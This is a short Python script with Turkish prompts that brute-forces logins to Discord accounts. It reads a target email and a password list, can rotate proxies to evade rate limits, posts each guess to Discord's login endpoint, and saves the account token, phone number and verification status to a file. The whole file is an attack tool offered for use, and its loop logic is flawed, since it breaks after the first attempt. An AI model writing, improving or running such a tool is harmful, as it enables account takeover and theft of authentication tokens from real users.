import requests

email = input("Mail giriniz : ")
file_name = input("Şifre listesi girininiz : ")

with open(file_name, "r") as f:
    passwords = f.read().splitlines()

use_proxy = input("Proxy listesi belirtecekmisiniz? (y/n): ")
if use_proxy == 'y':
    proxy_file = input("Proxy liste yolu giriniz: ")
    with open(proxy_file, "r") as f:
        proxies = f.read().splitlines()
    proxy_index = 0
else:
    proxies = None

for password in passwords:
    print("Trying password: ", password)
    
    data = {"email": email, "password": password}

    if proxies:
        response = requests.post("https://discord.com/api/v9/auth/login", json=data, proxies={"http": proxies[proxy_index], "https": proxies[proxy_index]})
        proxy_index +=1
    else:
        response = requests.post("https://discord.com/api/v9/auth/login", json=data)

    
        if response.status_code == 200:
            print("Başarıyla Giriş Yapıldı.")
    

    response_json = response.json()
    token = response_json.get("token")
    user_settings = response_json.get("user_settings", {})

    verified = False
    phone = None
    if user_settings.get("phone"):
        phone = user_settings.get("phone")
    if user_settings.get("phone_verified"):
        verified = True

    success = {
        "email": email,
        "password": password,
        "response_text": response.text,
        "status_code": response.status_code,
        "token": token,
        "phone_verified": verified,
        "phone": phone
    }

    with open("success.txt", "w") as f:
        f.write(str(success))
        print("Hesap bilgileri dosyaya kaydedildi success.txt")
    break
else:
    print("Başarısız.")

